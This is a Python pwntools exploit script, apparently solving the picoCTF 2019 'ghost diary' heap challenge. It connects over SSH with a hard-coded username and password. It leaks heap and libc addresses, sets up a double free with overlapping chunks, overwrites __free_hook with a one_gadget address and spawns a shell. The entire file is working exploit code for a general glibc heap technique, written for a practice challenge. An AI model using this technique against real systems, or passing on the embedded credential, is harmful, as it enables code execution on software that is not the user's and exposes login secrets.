from pwn import *
from time import sleep

s = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='pBCNtaNiAc7Fs&F')
p = s.process('ghostdiary', cwd='/problems/ghost-diary_5_7e39864bc6dc6e66a1ac8f4632e5ffba')

# Standard helper methods
def flush():
    time.sleep(0.1)
    return p.recv(4096)

def new_page(size):
    p.sendline('1')
    if size <= 240:
        p.sendline('1')
    elif size >= 272 and size <= 480:
        p.sendline('2')
    else:
        print('Invalid size')
        print(0/0)
    p.sendline(str(size))
    flush()
    
def write_page(page, content):
    p.sendline('2')
    p.sendline(str(page))
    p.sendline(content)
    flush()
    
def read_page(page):
    p.sendline('3')
    p.sendline(str(page))
    return flush()

def burn_page(page):
    p.sendline('4')
    p.sendline(str(page))
    flush()

""" HEAP LEAK """
raw_input('[leak heap]')
# Get a chunk to store a tcache linked list pointer ...
new_page(240); new_page(240)
burn_page(0); burn_page(1)
for i in range(7): # Here we overcome tcache
    new_page(240)
# ... then we read this tcache pointer ...
leak = read_page('0').split()
leak = leak[leak.index('Content:')+1]
leak = [hex(ord(c))[2:] for c in leak[::-1]]
# --- and compute offset
HEAP_BASE = int(''.join(leak),16)-0x260
print('---- HEAP BASE: ' + hex(HEAP_BASE) + ' ----')

""" DOUBLE FREE """
raw_input('[double free]')
new_page(280) # pg 7 (chunk 0)
new_page(280) # pg 8 (chunk 1)
new_page(240) # pg 9 (chunk 2)
new_page(24)  # guard --- prevents consolidation with wilderness
# Write addresses to chunk 1 (pg 8) into chunk 0 (pg 7)
write_page(7, 2*p64(0) + 2*p64(HEAP_BASE+0xa70))
# Write addresses to chunk 0 (pg 7) into chunk 1 (pg 8)
write_page(8, p64(0) + p64(HEAP_BASE+0x960) + (35-3)*p64(0) + p64(0x120))
# Now trigger the double-free
for i in range(10): # don't free the guard
    burn_page(i)

""" LEAK LIBC """
raw_input('[leak libc]')
# Just read off of the chunk from the unsorted chunk freed linked list
new_page(296) # pg 0 --- size is bigger than 
leak = read_page(0).split()
leak = leak[leak.index('Content:')+1]
leak = [hex(ord(c))[2:] for c in leak[::-1]]
LIBC_BASE = int(''.join(leak),16) - 0x3CA1F0 - 528
ONE_GADGET = LIBC_BASE + 0x2D872
FREE_HOOK = LIBC_BASE + 0x3cbe38
print('---- LIBC BASE: ' + hex(LIBC_BASE) + ' ----')
print('---- FREE HOOK: ' + hex(FREE_HOOK) + ' ----')
    
""" USE DOUBLE FREE """
raw_input('[overwrite free]')
write_page(0, p64(FREE_HOOK))
new_page(280) # pg 1 --- push FREE_HOOK onto tcache
new_page(280) # pg 2 --- this is FREE_HOOK
write_page(2, p64(ONE_GADGET)) # sets free = one_gadget
raw_input('[get shell]')
# Free anything; we're good to go
burn_page(0)
p.interactive()